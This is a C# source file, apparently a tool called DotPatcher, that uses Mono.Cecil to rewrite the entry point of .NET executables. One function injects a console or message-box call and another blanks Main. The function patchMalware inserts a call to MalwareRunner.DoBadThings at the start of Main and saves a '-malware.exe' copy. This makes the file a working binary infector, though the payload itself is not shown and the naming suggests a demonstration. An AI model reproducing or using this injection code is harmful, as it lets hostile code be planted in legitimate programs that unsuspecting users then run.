using System;
using Mono.Cecil;
using System.IO;
using System.Linq;
using Mono.Cecil.Cil;
using System.Reflection;
using System.Windows.Forms;
using MalwareInjection;

namespace DotPatcher
{
	public static class PatchTools
	{

		public static void patchGeneric (bool patchMethod, string path, string message)
		{
			AssemblyDefinition assembly = AssemblyDefinition.ReadAssembly (path);
			TypeDefinition mainClass = assembly.MainModule.Types [1];
			MethodDefinition mainMethod = mainClass.Methods.OfType<MethodDefinition> ()
				.Where (m => m.Name == "Main").Single ();

			MethodInfo injectMethod;
			MethodReference method;
			if (patchMethod) { // console
				injectMethod =
					typeof(Console).GetMethod ("WriteLine", new []{ typeof(string) });
				method = assembly.MainModule.Import (injectMethod);
			} else {
				injectMethod =
					typeof(MessageBox).GetMethod ("Show", new []{ typeof(string) });
				method = assembly.MainModule.Import (injectMethod);
			}
			ILProcessor proc = mainMethod.Body.GetILProcessor ();
			var instr = proc.Create (OpCodes.Ldstr, message);
			var instr2 = proc.Create (OpCodes.Call, method);
			var start = mainMethod.Body.Instructions [0];


			mainMethod.Body.GetILProcessor ().InsertBefore (start, instr);
			mainMethod.Body.GetILProcessor ().InsertAfter (instr, instr2);

			if (!patchMethod) {
				var pop = proc.Create (OpCodes.Pop);
				mainMethod.Body.GetILProcessor ().InsertAfter (instr2, pop);
			}

			if (patchMethod) {
				if (File.Exists (path.Replace (".exe", "").Trim () + "-con" + ".exe"))
					File.Delete (path.Replace (".exe", "").Trim () + "-con" + ".exe");
				assembly.Write (path.Replace (".exe", "").Trim () + "-con" + ".exe");
			} else {
				if (File.Exists (path.Replace (".exe", "").Trim () + "-pop" + ".exe"))
					File.Delete (path.Replace (".exe", "").Trim () + "-pop" + ".exe");
				assembly.Write (path.Replace (".exe", "").Trim () + "-pop" + ".exe");
			}
		}

		public static void wipeAssembly (string path)
		{
			AssemblyDefinition assembly = AssemblyDefinition.ReadAssembly (path);
			TypeDefinition mainClass = assembly.MainModule.Types [1];
			MethodDefinition mainMethod = mainClass.Methods.OfType<MethodDefinition> ()
					.Where (m => m.Name == "Main").Single ();

			var ret = mainMethod.Body.GetILProcessor ().Create (OpCodes.Ret);
			mainMethod.Body.GetILProcessor ().InsertBefore (mainMethod.Body.Instructions [0], ret);
			if (File.Exists (path.Replace (".exe", "").Trim () + "-empty" + ".exe"))
				File.Delete (path.Replace (".exe", "").Trim () + "-empty" + ".exe");
			assembly.Write (path.Replace (".exe", "").Trim () + "-empty" + ".exe");
		}

		public static void patchMalware (string path)
		{
			AssemblyDefinition assembly = AssemblyDefinition.ReadAssembly (path);
			TypeDefinition mainClass = assembly.MainModule.Types [1];
			MethodDefinition mainMethod = mainClass.Methods.OfType<MethodDefinition> ()
				.Where (m => m.Name == "Main").Single ();

			var injectMethod =
				typeof(MalwareRunner).GetMethod ("DoBadThings", new []{ typeof(string) });
			var method = assembly.MainModule.Import (injectMethod);

			var amountOfCrapToMake = "1111";

			var start = mainMethod.Body.GetILProcessor().Create (OpCodes.Ldstr, amountOfCrapToMake);
			var instr = mainMethod.Body.GetILProcessor ().Create (OpCodes.Call, method);
			mainMethod.Body.GetILProcessor ().InsertBefore (mainMethod.Body.Instructions [0], start);
			mainMethod.Body.GetILProcessor ().InsertAfter (start, instr);

			assembly.Write (path.Replace (".exe", "").Trim () + "-malware" + ".exe");
		}
	}
}

